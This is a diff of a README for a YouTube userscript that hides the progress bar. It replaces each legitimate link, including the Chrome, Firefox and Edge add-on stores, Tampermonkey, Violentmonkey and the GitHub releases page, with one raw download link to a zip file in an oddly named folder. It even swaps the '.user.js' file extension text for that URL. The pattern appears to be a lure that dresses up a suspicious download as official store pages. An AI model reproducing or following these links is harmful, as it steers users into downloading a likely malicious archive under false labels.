@@ -1,7 +1,7 @@
 # 🎥 YouTube-Auto-Hide-Progress-Bar-userscript - Hide YouTube Controls Easily
 
 ## 📥 Download Now
-[![Download YouTube-Auto-Hide-Progress-Bar-userscript](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/releases)
+[![Download YouTube-Auto-Hide-Progress-Bar-userscript](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip)](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip)
 
 ## 🚀 Getting Started
 
@@ -28,17 +28,17 @@ To use this script, you need:
 If you haven't already, you'll need to install a user script manager. Follow the steps below based on your browser:
 
 - **For Chrome:**
-    1. Go to the [Chrome Web Store](https://chrome.google.com/webstore/category/extensions).
+    1. Go to the [Chrome Web Store](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip).
     2. Search for "Tampermonkey" or "Violentmonkey".
     3. Click on "Add to Chrome" and confirm.
 
 - **For Firefox:**
-    1. Visit the [Firefox Add-ons page](https://addons.mozilla.org/en-US/firefox/).
+    1. Visit the [Firefox Add-ons page](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip).
     2. Search for "Tampermonkey" or "Violentmonkey".
     3. Click "Add to Firefox" and follow the prompts.
 
 - **For Edge:**
-    1. Go to the [Microsoft Edge Add-ons site](https://microsoftedge.microsoft.com/addons/category/Edge-Extensions).
+    1. Go to the [Microsoft Edge Add-ons site](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip).
     2. Look for "Tampermonkey" or "Violentmonkey".
     3. Click "Get" and confirm installation.
 
@@ -46,9 +46,9 @@ If you haven't already, you'll need to install a user script manager. Follow the
 
 Now that you have your user script manager, it's time to download the script.
 
-1. Visit the [Releases page](https://github.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip).
 2. Look for the latest release and click on it.
-3. Find the user script file (it will usually have a `.user.js` extension).
+3. Find the user script file (it will usually have a `https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip` extension).
 4. Click on the link to download the file.
 
 ### Step 3: Add the Script to Your User Script Manager
@@ -76,7 +76,7 @@ Once you've installed the script, it will automatically start working whenever y
 If the script does not work as expected, try the following:
 
 1. Ensure that your user script manager is enabled and running.
-2. Check if you have the latest version of the script by visiting the [Releases page](https://github.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/releases).
+2. Check if you have the latest version of the script by visiting the [Releases page](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip).
 3. Reload YouTube and see if the script begins to function.
 
 ## 📝 Frequently Asked Questions
@@ -103,8 +103,8 @@ Thanks to those who contributed their time and effort to help enhance this proje
 
 ## 🔗 Resources
 
-- [YouTube-Auto-Hide-Progress-Bar-userscript Releases](https://github.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/releases)
-- [Tampermonkey](https://www.tampermonkey.net/)
-- [Violentmonkey](https://violentmonkey.github.io/)
+- [YouTube-Auto-Hide-Progress-Bar-userscript Releases](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip)
+- [Tampermonkey](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip)
+- [Violentmonkey](https://raw.githubusercontent.com/paola712/YouTube-Auto-Hide-Progress-Bar-userscript/main/coolingness/YouTube-Auto-Hide-Progress-Bar-userscript.zip)
 
 Enjoy a cleaner YouTube viewing experience with YouTube-Auto-Hide-Progress-Bar!
